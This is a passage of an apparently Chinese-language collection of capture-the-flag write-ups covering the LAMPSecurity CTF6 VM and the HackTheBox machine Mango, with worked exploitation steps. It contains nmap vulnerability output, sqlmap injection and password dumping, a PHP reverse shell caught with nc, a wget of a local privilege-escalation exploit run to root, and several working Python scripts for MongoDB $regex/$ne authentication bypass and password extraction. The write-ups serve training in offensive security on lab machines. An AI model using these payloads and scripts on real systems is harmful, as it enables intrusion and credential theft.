|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: 
993/tcp  open  ssl/imaps?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
| sslv2-drown: 
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|   vulns: 
|     CVE-2016-0800: 
|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)
|       state: VULNERABLE
|       ids: 
|         CVE:CVE-2016-0800
|       description: 
|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and
|       other products, requires a server to send a ServerVerify message before establishing
|       that a client possesses certain plaintext RSA data, which makes it easier for remote
|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
|       oracle, aka a "DROWN" attack.
|     
|       refs: 
|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800
|_        https://www.openssl.org/news/secadv/20160301.txt
995/tcp  open  ssl/pop3s?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql      MySQL 5.0.45
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:mysql:mysql:5.0.45: 
|       CVE-2009-2446   8.5     https://vulners.com/cve/CVE-2009-2446
|       CVE-2008-0226   7.5     https://vulners.com/cve/CVE-2008-0226
|       CVE-2009-5026   6.8     https://vulners.com/cve/CVE-2009-5026
|       CVE-2009-4028   6.8     https://vulners.com/cve/CVE-2009-4028
|       CVE-2010-1848   6.5     https://vulners.com/cve/CVE-2010-1848
|       CVE-2010-1850   6.0     https://vulners.com/cve/CVE-2010-1850
|       CVE-2008-7247   6.0     https://vulners.com/cve/CVE-2008-7247
|       CVE-2010-3833   5.0     https://vulners.com/cve/CVE-2010-3833
|       CVE-2010-1849   5.0     https://vulners.com/cve/CVE-2010-1849
|       CVE-2008-4098   4.6     https://vulners.com/cve/CVE-2008-4098
|       CVE-2008-2079   4.6     https://vulners.com/cve/CVE-2008-2079
|       CVE-2012-0490   4.0     https://vulners.com/cve/CVE-2012-0490
|       CVE-2012-0484   4.0     https://vulners.com/cve/CVE-2012-0484
|       CVE-2012-0102   4.0     https://vulners.com/cve/CVE-2012-0102
|       CVE-2012-0101   4.0     https://vulners.com/cve/CVE-2012-0101
|       CVE-2012-0087   4.0     https://vulners.com/cve/CVE-2012-0087
|       CVE-2010-3838   4.0     https://vulners.com/cve/CVE-2010-3838
|       CVE-2010-3837   4.0     https://vulners.com/cve/CVE-2010-3837
|       CVE-2010-3836   4.0     https://vulners.com/cve/CVE-2010-3836
|       CVE-2010-3834   4.0     https://vulners.com/cve/CVE-2010-3834
|       CVE-2010-3682   4.0     https://vulners.com/cve/CVE-2010-3682
|       CVE-2010-3677   4.0     https://vulners.com/cve/CVE-2010-3677
|       CVE-2009-4019   4.0     https://vulners.com/cve/CVE-2009-4019
|       CVE-2008-3963   4.0     https://vulners.com/cve/CVE-2008-3963
|       CVE-2010-1626   3.6     https://vulners.com/cve/CVE-2010-1626
|       CVE-2012-0114   3.0     https://vulners.com/cve/CVE-2012-0114
|       CVE-2008-4456   2.6     https://vulners.com/cve/CVE-2008-4456
|_      CVE-2012-0075   1.7     https://vulners.com/cve/CVE-2012-0075
```

可以发现开了很多端口和服务，存在非常多的漏洞

点击主页上的read more,发现存在id参数，抓包直接sqlmap注入一波

``` bash
$ sqlmap.py -r sqlmap.txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.12.1#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:33:15 /2019-12-17/

[10:33:15] [INFO] parsing HTTP request from 'sqlmap.txt'
[10:33:16] [INFO] resuming back-end DBMS 'mysql'
[10:33:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 8397=8397

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY
---
[10:33:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[10:33:16] [INFO] fetched data logged to text files under 'C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129'

[*] ending @ 10:33:16 /2019-12-17/
```

得到登录的用户名和密码

``` bash
$ sqlmap.py -r sqlmap.txt -D cms -T user --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.12.1#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:25:54 /2019-12-17/

[10:25:54] [INFO] parsing HTTP request from 'sqlmap.txt'
[10:25:54] [INFO] resuming back-end DBMS 'mysql'
[10:25:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 8397=8397

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY
---
[10:25:54] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[10:25:54] [INFO] fetching columns for table 'user' in database 'cms'
[10:25:54] [INFO] fetching entries for table 'user' in database 'cms'
[10:25:54] [INFO] recognized possible password hashes in column 'user_password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[10:25:54] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file 'D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1\data\txt\wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[10:25:54] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[10:25:54] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[10:25:54] [INFO] starting 12 processes
[10:25:58] [INFO] cracked password 'adminpass' for hash '25e4ee4e9229397b6b17776bfceaf8e7'
[10:26:04] [INFO] current status: ZZyZZ... \Database: cms
Table: user
[1 entry]
+---------+----------------------------------------------+---------------+
| user_id | user_password                                | user_username |
+---------+----------------------------------------------+---------------+
| 1       | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) | admin         |
+---------+----------------------------------------------+---------------+

[10:26:04] [INFO] table 'cms.`user`' dumped to CSV file 'C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129\dump\cms\user.csv'
[10:26:04] [INFO] fetched data logged to text files under 'C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129'

[*] ending @ 10:26:04 /2019-12-17/
```

成功之后直接上传.php文件

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub64.jpg)

如下图所示成功上传，然后访问shell，kali端nc -lvp 5566监听

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub65.jpg)

成功返回shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.142.129: inverse host lookup failed: Unknown host
connect to [192.168.142.128] from (UNKNOWN) [192.168.142.129] 37560
Linux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux
 02:37:06 up  1:08,  0 users,  load average: 0.10, 0.08, 0.45
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-3.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-3.2$ whoami
apache
sh-3.2$ pwd
/
sh-3.2$
```

#### 提权

命令行信息收集

``` bash
sh-3.2$ python -c 'import pty; pty.spawn("/bin/sh")'
sh-3.2$ uname -a
Linux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux
sh-3.2$ cat /etc/*release*
cat: /etc/lsb-release.d: Is a directory
CentOS release 5.2 (Final)
```

下载提权脚本开始提权，[exploits-8478](https://www.exploit-db.com/exploits/8478)


kali执行
``` bash
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

shell中执行

``` bash
sh-3.2$ wget http://192.168.142.128:8000/8478.sh
wget http://192.168.142.128:8000/8478.sh
--02:52:03--  http://192.168.142.128:8000/8478.sh
Connecting to 192.168.142.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3498 (3.4K) [text/x-sh]
Saving to: `8478.sh'

100%[=======================================>] 3,498       --.-K/s   in 0s     

02:52:03 (603 MB/s) - `8478.sh' saved [3498/3498]
```
该漏洞利用程序需要udev进程的PID，运行脚本开始提权，该漏洞利用程序无法完美运行，在下面看到的那样，需要进行多次尝试才能获得root shell。

``` bash
sh-3.2$ cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
cf865000 0   2930   00000111 0        0        00000000 2
cfebce00 0   0      00000000 0        0        00000000 2
cfc94a00 6   0      00000000 0        0        00000000 2
cfe70600 7   0      00000000 0        0        00000000 2
cf86ec00 9   2260   00000000 0        0        00000000 2
cfe5fe00 9   0      00000000 0        0        00000000 2
cf54fc00 10  0      00000000 0        0        00000000 2
cf517c00 11  0      00000000 0        0        00000000 2
cfebcc00 15  0      00000000 0        0        00000000 2
cfc94400 15  554    ffffffff 0        0        00000000 2
cf517a00 16  0      00000000 0        0        00000000 2
cfd2fa00 18  0      00000000 0        0        00000000 2
sh-3.2$ sed -i -e 's/\r$//' 8478.sh
sh-3.2$ ./8478.sh 554
suid.c: In function 'main':
suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
sh-3.2$ ./8478.sh 554
./8478.sh 554
suid.c: In function 'main':
suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
sh-3.2# whoami
whoami
root
sh-3.2# id
id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.2#
```
![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub66.jpg)

提权成功,注意，脚本下载完成后运行

``` bash
sed -i -e 's/\r$//' 8478.sh
```

这条命令很重要，不运行此命令，脚本无法执行

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="red">***The end,to be continue...***</font>

<!-- kb:end LAMPSecurity-CTF6 -->

</details>

<a id="case-mango"></a>

## MongoDB 运算符与响应侧信道

原记录依据 200 与 302 响应逐字符恢复用户字段，保留 Python 枚举脚本和最后的 Java/SUID 权限分析。

<p class="kb-provenance">来源 mango · 原记录 2020-04-20 · 21 个代码块 · 12 处图片引用</p>

<details class="kb-evidence" id="record-mango">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start mango -->

#### 介绍

操作系统：Linux
难度：中等
点数：30
发行：2019年10月26日
IP：10.10.10.162

user一血用时：04小时28分58秒。
root一血用时：05小时14分45秒。

看来是真特么的耗时间

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg)
 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### 信息收集

上nmap

``` bash
C:\Users\HASEE>nmap -p- --min-rate=1000 -T4 -v -sV 10.10.10.162
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

``` bash
C:\Users\HASEE>nmap -p 22,80,443 -A -v 10.10.10.162
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```

Nmap扫描显示运行其通常服务的端口22、80和443。此外，Nmap还发现了一个名为stage -order.mango的vhost。在SSL证书中提到的htb。添加mango.htb和staging-order.mango.htb到/etc/hosts，然后继续枚举。

浏览到端口80将返回一个403禁止错误，然而，HTTPS网站显示了一个搜索引擎。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb15.jpg)

页面只是刷新，搜索时不返回任何结果。第二个vhost在HTTPS上托管返回相同的页面。然而，HTTP网站却只是显示了一个登录页面。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb16.jpg)

尝试使用通用默认凭据登录失败。在Burp中拦截请求并检查登录请求。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb17.jpg)

注入引号没有返回错误或改变响应。由于网站正在运行PHP，可以尝试使用类型杂耍绕过身份验证。
这可以通过向请求参数添加[]来实现，这使得PHP将它们作为数组使用。如果存在任何弱比较，则将绕过身份验证。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb18.jpg)

会导致失败的尝试。尝试一下NoSQL注入攻击，比如MongoDB身份验证绕过。MongoDB使用$ne (not equal)操作符来比较值。这个操作符可以通过数组语法传递给PHP，它最终会被注入到MongoDB查询中。

这是一个例子MongoDB查询找到一个用户

``` bash
db.users.find({ username: "admin", password: "admin" });
```

上面的查询将导致由于密码错误而导致登录失败。发送参数password[$ne]=admin的请求将导致查询:

``` bash
db.users.find({ username: "admin", password: { $ne : "admin" } });
```

这将返回true，因为admin的密码不等于admin，会成功地绕过登录。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb19.jpg)

$ne的注入被发现是成功的，并且页面将重定向到home.php作为admin。使用登录请求重复相同的过程将返回以下页面。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb20.jpg)

#### MongoDB注入

因为主页没有返回任何有用的信息。可以尝试使用$regex操作符从Mongo数据库中提取数据。$regex操作符可用于使用正则表达式查找数据。

例如，下面的查询将搜索匹配

regex a.*

的用户名，匹配任何包含a的用户名。

``` bash
db.users.find({ username: { $regex : "a.*", password: { $ne : "admin" } });
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb21.jpg)

用b.*替换a.*返回200响应，这意味着没有包含b的用户名。编写一个使用此逻辑发现用户名的脚本。


``` bash
from requests import post
from string import lowercase
url = 'http://staging-order.mango.htb/'
def sendPayload():
    for char in lowercase:
        regex = '{}.*'.format(char)
        data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' : 'login' }
        response = post(url, data = data, allow_redirects=False)
        if response.status_code == 302:
            print "Found valid letter: {}".format(char)
def getUser():
    sendPayload()
if __name__ == '__main__':
    getUser()
```

代码已经缩进好了，直接复制粘贴就可以使用

运行代码，列出DB中所有用户名中出现的所有字符。

``` bash
Found valid letter: a
Found valid letter: d
Found valid letter: g
Found valid letter: i
Found valid letter: m
Found valid letter: n
Found valid letter: o
```

脚本发现了7个有效字符，即a、d、g、i、m、n、o。现在已经减少了字符集，可以尝试显示实际的用户名。regex中的插入符号^用于标记单词的开头。例如，模式^a.*仅当用户名以a开头时才返回true。
类似地，模式^ad.*如果以ad开头的用户名存在，则返回true，以此类推。使用这个逻辑更新脚本。

``` bash
from requests import post
from string import lowercase
url = 'http://staging-order.mango.htb/'
valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
def sendPayload(word):
    regex = '^{}.*'.format(word)
    data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' : 'login' }
    response = post(url, data = data, allow_redirects=False)
    if response.status_code == 302:
        return word
    else:
        return None
def getUser():
    for char in valid:
        if sendPayload(char) != None:
            print "Found username starting with {}".format(char)
if __name__ == '__main__':
    getUser()
```
脚本循环遍历字符集，查找以这些字母中的任何一个开头的用户名。
运行脚本后出现下面的结果

``` bash
Found username starting with a
Found username starting with m
```

发现DB分别包含以a和m开头的用户名。更新脚本以显示真正的用户名。

``` bash
from requests import post
from string import lowercase
url = 'http://staging-order.mango.htb/'
valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
def sendPayload(word):
    for char in valid:
        regex = '^{}.*'.format(word + char)
        data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' : 'login' }
        response = post(url, data = data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None
def getUser():
    for ch in ['a', 'm']:
        username = ch
        while True:
            char = sendPayload(username)
            if char != None:
                username += char
            else:
                print "Username found: {}".format(username)
                break

if __name__ == '__main__':
    getUser()
```

脚本循环遍历有效字符并查找以a和m开头的用户名。

包含302状态码(URL重定向)的HTTP响应包含一个有效字符，该脚本输出结果如下。

``` bash
Username found: admin
Username found: mango
```

标识了两个有效的用户名，admin和mango。可以尝试使用相同的逻辑来识别他们的密码。

修改脚本如下所示

``` bash
from requests import post
from string import printable
url = 'http://staging-order.mango.htb/'
def sendPayload(user):
    valid = []
    for char in printable:
        regex = '{}.*'.format(char)
        data = { 'username' : user, 'password[$regex]' : regex, 'login' : 'login' }
        response = post(url, data = data, allow_redirects=False)
        if response.status_code == 302:
            valid.append(char)
    return valid
def getUser():
    for user in ['admin', 'mango']:
        valid = sendPayload(user)
        print "Valid characters for {}: {}".format(user, valid)
if __name__ == '__main__':
    getUser()
```

该脚本遍历所有可打印的ASCII字符。分别为两个用户返回有效的字符集，从而减少了下一阶段的请求数量。

运行结果如下

``` bash
Valid characters for admin: ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '$', '.', '>', '\\', '^', '|']
Valid characters for mango: ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '$', '.', '\\', ']', '^', '{', '|', '~']
```

#### 以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码

现在已经有了两个密码的字符集，更新脚本来查找密码。字符
``` bash
^，$，|，\\和.
```
应该用反斜杠进行转义，因为它们在正则表达式中具有特殊意义，并且可能导致错误的否定。

依照之前爆破用户名脚本的方法修改脚本如下

``` bash
from requests import post
from string import printable
url = 'http://staging-order.mango.htb/'
admin_pass = ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '\\$', '\\.', '>', '\\\\', '\\^', '\\|']
mango_pass = ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '\\$', '\\.', '\\\\', ']', '\\^', '{', '\\|', '~']
def sendPayload(user, word):
    valid = admin_pass if user == 'admin' else mango_pass
    for char in valid:
        regex = '^{}.*'.format(word + char)
        data = { 'username' : user, 'password[$regex]' : regex, 'login' : 'login' }
        response = post(url, data = data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None
def getUser():
    for user in ['admin', 'mango']:
        password = ''
        while True:
            char = sendPayload(user, password)
            if char != None:
                password += char
            else:
                print "Password for {} found: {}".format(user, password)
                break
if __name__ == '__main__':
    getUser()
```

